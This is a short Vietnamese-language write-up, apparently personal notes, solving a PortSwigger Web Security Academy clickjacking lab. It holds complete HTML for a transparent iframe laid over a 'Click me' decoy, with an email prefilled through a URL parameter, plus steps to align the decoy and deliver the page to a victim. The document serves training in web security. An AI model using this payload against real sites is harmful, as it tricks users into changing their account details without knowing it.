
**Mục tiêu:** Dùng Clickjacking lừa victim bấm nút "Update email" để đổi email của họ.
![[Pasted image 20261107122847.png]]
**Các bước mình làm:**

1. **Tạo Payload:** Mình lên Exploit Server, dán đoạn HTML sau vào Body. Mình dùng tham số `?email=` để tự động điền sẵn email của mình vào form. Mình để `opacity: 0.1` để dễ nhìn và căn chỉnh nút.
```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 700px;
        opacity: 0.001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 480px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a4e00000390f605809e038c000200dd.web-security-academy.net/my-account?email=hacker@evil-user.net"></iframe>
```
2. **Căn chỉnh:** Bấm **View exploit**, mình chỉnh thuộc tính `top` và `left` của thẻ `div` cho đến khi rê chuột vào chữ "Click me" thấy con trỏ chuyển thành hình bàn tay (tức là đã đè khít lên nút "Update email" thật).
3. **Chốt hạ:** 
   * Đổi `opacity` thành `0.0001` (để iframe tàng hình).
   * Vì lúc test mình đã lỡ đổi email của mình thành `hacker@evil-user.net` rồi, nên mình đổi trong payload thành một email mới: `?email=hacker_new@evil-user.net`.
   * Bấm **Store**, rồi **Deliver exploit to victim**. 
![[Pasted image 20261107122753.png|615]]
Lab solved!
![[Pasted image 20261107122908.png|617]]